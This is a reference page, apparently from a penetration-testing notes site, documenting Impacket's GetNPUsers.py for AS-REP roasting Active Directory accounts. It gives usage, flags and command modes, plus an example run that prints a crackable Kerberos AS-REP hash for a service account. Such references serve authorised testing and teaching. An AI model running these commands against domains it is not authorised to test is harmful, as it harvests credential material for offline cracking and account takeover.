---
title : "GetNPUsers.py"
# pre : ' '
description : "Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking. (ASREPRoasting)"
date : 2022-02-14T11:57:53+01:00
# hidden : true
# draft : true
weight : 30
# tags : ['']
---

---

Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking (ASREPRoasting).

## Installation

Install [Impacket]({{< ref "../impacket" >}}).

## Usage

```plain
GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname] target
```

## Flags

```plain
Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

positional arguments:
  target                [[domain/]username[:password]]

options:
  -h, --help            show this help message and exit
  -request              Requests TGT for users and output them in JtR/hashcat format (default False)
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format
  -format {hashcat,john}
                        format to save the AS_REQ of users without pre-authentication. Default is hashcat
  -usersfile USERSFILE  File with user per line to test
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used

There are a few modes for using this script

1. Get a TGT for a user:

        GetNPUsers.py contoso.com/john.doe -no-pass

For this operation you don't need john.doe's password. It is important tho, to specify -no-pass in the script, 
otherwise a badpwdcount entry will be added to the user

2. Get a list of users with UF_DONT_REQUIRE_PREAUTH set

        GetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily

This will list all the users in the contoso.com domain that have UF_DONT_REQUIRE_PREAUTH set. 
However it will require you to have emily's password. (If you don't specify it, it will be asked by the script)

3. Request TGTs for all users

        GetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily

4. Request TGTs for users in a file

        GetNPUsers.py -no-pass -usersfile users.txt contoso.com/

For this operation you don't need credentials.
```

## Examples

```plain
GetNPUsers.py offsec.nl/ -usersfile users -dc-ip 10.10.20.134
Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

[-] User johndo doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@offsec.nl:0507c99ed0c44924dee1bd4fdb34e0b9$e6abe0cd017c45688ff4d667183ce9c8cb171635250c7a5d1f12666549466ecb367e6445751b867a44f483e8b255ebd039ea7375229a1c6763eb61965d34945b8500058e36dd32fadd6bdc5dc5fff5ef6ebc90343bdf177984852b3536fb12ab4a21f8cdee93339e7fc97d3028eb1f7643e1c9156f7d1facd658dd5b2061572f615abc4ea4007294ee648f38af428ef5f7045bb194c44bfef4f39f14ad02e982f74ef49a5a904e874ce1c2b5a38b61a4b30b58b2b521f4f81cdaee348b497a9ca757fe33e30e9ef6c7911963e120e905f5cf063964b5a13f7d9668a1f3e63466d1c0d18d9e76e31a8bec236fff42fa928dac
[-] User johndo-adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User janedo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## URL List

- [Github.com - GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
